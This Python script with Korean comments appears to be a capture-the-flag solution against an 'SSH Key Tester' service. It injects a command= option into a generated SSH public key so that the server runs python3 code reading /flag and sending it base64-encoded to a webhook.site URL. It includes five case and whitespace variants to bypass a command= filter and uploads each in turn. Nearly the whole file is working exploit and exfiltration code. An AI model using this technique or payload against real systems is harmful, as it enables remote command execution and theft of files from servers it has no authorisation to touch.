#!/usr/bin/env python3
import os
import subprocess
import requests
import sys
from pathlib import Path

def generate_ssh_keys():
    """SSH 키 쌍을 생성합니다."""
    print("1. SSH 키 쌍 생성 중...")
    
    # 현재 디렉토리에 키 파일 생성
    private_key_path = "id_rsa"
    public_key_path = "id_rsa.pub"
    
    # 기존 키 파일이 있으면 삭제
    for key_file in [private_key_path, public_key_path]:
        if os.path.exists(key_file):
            os.remove(key_file)
            print(f"   기존 {key_file} 파일 삭제됨")
    
    try:
        # ssh-keygen 명령으로 키 쌍 생성
        cmd = [
            "ssh-keygen",
            "-t", "rsa",
            "-b", "2048",
            "-f", private_key_path,
            "-N", "",  # 패스프레이즈 없음
            "-C", "test@example.com"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"   ✅ SSH 키 쌍 생성 성공!")
            print(f"   - 개인키: {private_key_path}")
            print(f"   - 공개키: {public_key_path}")
            
            # 공개키 수정하여 webhook으로 플래그 전송
            modify_public_key(public_key_path)
            return True
        else:
            print(f"   ❌ SSH 키 생성 실패: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("   ❌ ssh-keygen 명령을 찾을 수 없습니다. OpenSSH가 설치되어 있는지 확인하세요.")
        return False
    except Exception as e:
        print(f"   ❌ SSH 키 생성 중 오류 발생: {e}")
        return False

def modify_public_key(public_key_path):
    """공개키를 수정하여 Python urllib로 webhook에 플래그를 전송하도록 합니다."""
    print("   공개키 수정 중 (Python urllib로 webhook 전송)...")
    
    try:
        # 원본 공개키 읽기
        with open(public_key_path, 'r') as f:
            original_pubkey = f.read().strip()
        
        print(f"   원본 공개키: {original_pubkey[:50]}...")
        
        # webhook URL
        webhook_url = "https://webhook.site/4a955af7-db95-4cca-83eb-446e19238b24"
        
        # 여러 우회 방법으로 Python urllib 사용 (따옴표 문제 완전 해결)
        bypass_methods = [
            # 방법 1: 대소문자 혼합 + 환경변수 활용
            f'Command="export URL={webhook_url} && python3 -c \\"import urllib.request,base64;urllib.request.urlopen(__import__(\'os\').environ[\'URL\']+\'/\'+base64.b64encode(open(\'/flag\',\'rb\').read()).decode())\\"" ' + original_pubkey,
            # 방법 2: 공백 추가 + 간단한 방식
            f' command="python3 -c \\"import urllib.request,base64;urllib.request.urlopen(\'https://webhook.site/4a955af7-db95-4cca-83eb-446e19238b24/\'+base64.b64encode(open(\'/flag\',\'rb\').read()).decode())\\"" ' + original_pubkey,
            # 방법 3: 탭 문자 + 축약
            f'\tcommand="python3 -c \\"import urllib.request as u,base64 as b;u.urlopen(\'https://webhook.site/4a955af7-db95-4cca-83eb-446e19238b24/\'+b.b64encode(open(\'/flag\',\'rb\').read()).decode())\\"" ' + original_pubkey,
            # 방법 4: 다른 옵션과 함께
            f'no-port-forwarding,command="python3 -c \\"import urllib.request,base64;urllib.request.urlopen(\'https://webhook.site/4a955af7-db95-4cca-83eb-446e19238b24/\'+base64.b64encode(open(\'/flag\',\'rb\').read()).decode())\\"" ' + original_pubkey,
            # 방법 5: 완전 대문자
            f'COMMAND="python3 -c \\"import urllib.request,base64;urllib.request.urlopen(\'https://webhook.site/4a955af7-db95-4cca-83eb-446e19238b24/\'+base64.b64encode(open(\'/flag\',\'rb\').read()).decode())\\"" ' + original_pubkey,
        ]
        
        # 첫 번째 방법으로 시도 (대소문자 혼합)
        modified_pubkey = bypass_methods[0]
        
        # 수정된 공개키 저장
        with open(public_key_path, 'w') as f:
            f.write(modified_pubkey)
        
        print(f"   ✅ 공개키 수정 완료!")
        print(f"   Webhook URL: {webhook_url}")
        print(f"   Python 페이로드 사용: urllib.request + base64 (환경변수)")
        print(f"   수정된 공개키: {modified_pubkey[:100]}...")
        
        # 백업용으로 다른 방법들도 파일로 저장
        for i, method in enumerate(bypass_methods[1:], 1):
            backup_path = f"id_rsa_method{i}.pub"
            with open(backup_path, 'w') as f:
                f.write(method)
            print(f"   백업 방법 {i}: {backup_path}")
        
    except Exception as e:
        print(f"   ❌ 공개키 수정 중 오류 발생: {e}")

def send_keys_to_server(server_url="http://localhost:8080"):
    """생성된 SSH 키를 서버에 전송합니다."""
    print("\n2. 도커 환경에 SSH 키 전송 중...")
    
    private_key_path = "id_rsa"
    public_key_path = "id_rsa.pub"
    
    # 키 파일 존재 확인
    if not os.path.exists(private_key_path) or not os.path.exists(public_key_path):
        print("   ❌ SSH 키 파일을 찾을 수 없습니다.")
        return False
    
    try:
        # 키 파일 읽기
        with open(private_key_path, 'rb') as f:
            private_key_content = f.read()
        
        with open(public_key_path, 'rb') as f:
            public_key_content = f.read()
        
        print(f"   개인키 크기: {len(private_key_content)} bytes")
        print(f"   공개키 크기: {len(public_key_content)} bytes")
        print(f"   공개키 내용 미리보기: {public_key_content[:100]}...")
        
        # POST 요청으로 파일 전송
        files = {
            'id_rsa': ('id_rsa', private_key_content, 'application/octet-stream'),
            'id_rsa.pub': ('id_rsa.pub', public_key_content, 'text/plain')
        }
        
        print(f"   서버 URL: {server_url}")
        response = requests.post(server_url, files=files, timeout=10)
        
        print(f"   응답 상태 코드: {response.status_code}")
        print(f"   응답 내용: {response.text}")
        
        if response.status_code == 200:
            print("   ✅ SSH 키 전송 성공!")
            return True
        else:
            print(f"   ❌ SSH 키 전송 실패 (상태 코드: {response.status_code})")
            return False
            
    except requests.exceptions.ConnectionError:
        print("   ❌ 서버에 연결할 수 없습니다. 도커 컨테이너가 실행 중인지 확인하세요.")
        return False
    except requests.exceptions.Timeout:
        print("   ❌ 요청 시간 초과")
        return False
    except Exception as e:
        print(f"   ❌ 키 전송 중 오류 발생: {e}")
        return False

def try_alternative_methods():
    """다른 우회 방법들을 시도합니다."""
    print("\n3. 대안 방법들 시도 중...")
    
    server_url = "http://localhost:8080"
    private_key_path = "id_rsa"
    
    # 백업 공개키 파일들 시도
    for i in range(1, 5):
        backup_pubkey_path = f"id_rsa_method{i}.pub"
        if os.path.exists(backup_pubkey_path):
            print(f"\n   방법 {i} 시도 중...")
            
            try:
                with open(private_key_path, 'rb') as f:
                    private_key_content = f.read()
                
                with open(backup_pubkey_path, 'rb') as f:
                    public_key_content = f.read()
                
                files = {
                    'id_rsa': ('id_rsa', private_key_content, 'application/octet-stream'),
                    'id_rsa.pub': ('id_rsa.pub', public_key_content, 'text/plain')
                }
                
                response = requests.post(server_url, files=files, timeout=10)
                print(f"   응답 상태 코드: {response.status_code}")
                print(f"   응답 내용: {response.text}")
                
                if response.status_code == 200:
                    print(f"   ✅ 방법 {i} 성공!")
                    return True
                    
            except Exception as e:
                print(f"   ❌ 방법 {i} 실패: {e}")
    
    return False

def main():
    """메인 함수"""
    print("=== SSH Key Tester 자동화 스크립트 (Python urllib Webhook) ===\n")
    
    # 1. SSH 키 쌍 생성
    if not generate_ssh_keys():
        print("\n❌ SSH 키 생성에 실패했습니다.")
        sys.exit(1)
    
    # 2. 서버에 키 전송
    if send_keys_to_server():
        print("\n✅ 첫 번째 방법으로 성공!")
    else:
        print("\n⚠️ 첫 번째 방법 실패, 대안 방법들 시도 중...")
        if try_alternative_methods():
            print("\n✅ 대안 방법으로 성공!")
        else:
            print("\n❌ 모든 방법이 실패했습니다.")
            sys.exit(1)
    
    print("\n✅ 모든 작업이 성공적으로 완료되었습니다!")
    print("\n4. 결과 요약:")
    print("   - SSH 키 쌍이 생성되어 현재 디렉토리에 저장되었습니다.")
    print("   - command= 필터링을 우회하는 공개키가 생성되었습니다.")
    print("   - Python urllib.request 모듈을 사용하여 플래그를 전송합니다.")
    print("   - 서버에서 SSH 연결 시 플래그가 base64 인코딩되어 webhook으로 전송됩니다.")
    print("   - Webhook URL: https://webhook.site/4a955af7-db95-4cca-83eb-446e19238b24")

if __name__ == "__main__":
    main() 